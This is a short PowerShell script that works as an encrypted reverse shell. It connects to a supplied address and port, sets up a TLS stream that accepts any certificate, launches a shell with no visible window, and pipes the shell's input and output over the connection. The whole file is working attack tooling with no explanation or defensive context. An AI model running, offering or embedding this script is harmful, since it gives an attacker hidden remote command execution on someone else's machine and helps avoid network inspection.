param($address,$port,$shell)
$tcpclient = new-object net.sockets.tcpclient($address,$port)
$tcpstream = $tcpclient.getstream()
$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true})
$tlsstream.authenticateasclient(0)
$tlsstreamwriter = new-object io.streamwriter($tlsstream)
$tlsstreamwriter.autoflush = $true
$tlsstreamreader = new-object io.streamreader($tlsstream)
$shellinfo = new-object diagnostics.processstartinfo
$shellinfo.filename = $shell
$shellinfo.createnowindow = $true
$shellinfo.useshellexecute = $false
$shellinfo.redirectstandardoutput = $true
$shellinfo.redirectstandarderror = $true
$shellinfo.redirectstandardinput = $true
$shell = new-object diagnostics.process
$shell.startinfo = $shellinfo
$shell.start()
$stdout = $shell.standardoutput
$stderr = $shell.standarderror
$stdin = $shell.standardinput
while(($shell.hasexited -eq $false))
{
	while($stdout.peek() -gt -1)
	{
		$tlsstreamwriter.write([char]$stdout.read())
	}
	$stdin.writeline($tlsstreamreader.readline())
	do
	{
		$tlsstreamwriter.write([char]$stdout.read())
	}
	until($stdout.peek() -le -1)
}
